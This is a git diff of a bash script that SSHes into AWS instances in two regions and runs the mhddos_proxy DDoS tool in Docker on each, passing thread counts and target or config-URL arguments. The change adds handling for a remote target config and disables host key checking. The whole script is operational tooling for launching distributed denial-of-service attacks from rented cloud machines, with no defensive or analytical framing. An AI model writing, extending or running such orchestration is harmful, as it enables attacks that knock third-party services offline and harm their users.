@@ -4,8 +4,6 @@ main(){
 	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`
 	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`
 
-	echo -e "Fires on\n${@}\nby:"
-
 	for ip in ${STOCKHOLM_INSTANCES_IPS}
 	do
 		fire "key-stockholm-0.pem" ${ip} ${@} &
@@ -24,7 +22,17 @@ fire(){
 	local IP=${2}
 	shift 2
 
-	echo -e "    ${IP}"
+	for p in ${@}
+	do
+		[[ ${p} == "-c" ]] &&
+		shift &&
+		CONFIG_URL=${1} &&
+		break
+	done
+
+	echo "${IP}"
+
+	[[ -z ${CONFIG_URL} ]] &&
 	ssh \
 		-o LogLevel=ERROR \
 		-i ${KEY} \
@@ -34,11 +42,25 @@ fire(){
 				sudo docker run \
 					-it \
 					--rm \
-					--pull always portholeascend/mhddos_proxy:latest ${@} \
-					-t 5000 \
-					-p 600 \
-					--proxy-timeout 4 \
-					--debug
+					--pull always portholeascend/mhddos_proxy:latest \
+					--debug \
+					-t 2000 \
+					${@} ||
+	ssh \
+		-o LogLevel=ERROR \
+		-i ${KEY} \
+		-o "StrictHostKeyChecking no" \
+		"ubuntu@${IP}" \
+			screen -dm \
+				sudo docker run \
+					-it \
+					--rm \
+					--pull always portholeascend/mhddos_proxy:latest \
+					--debug \
+					-t 2000 \
+					-c ${@}
 }
 
 ./checkAWS.sh && main ${@} || ./awsCliNa.sh
+
+
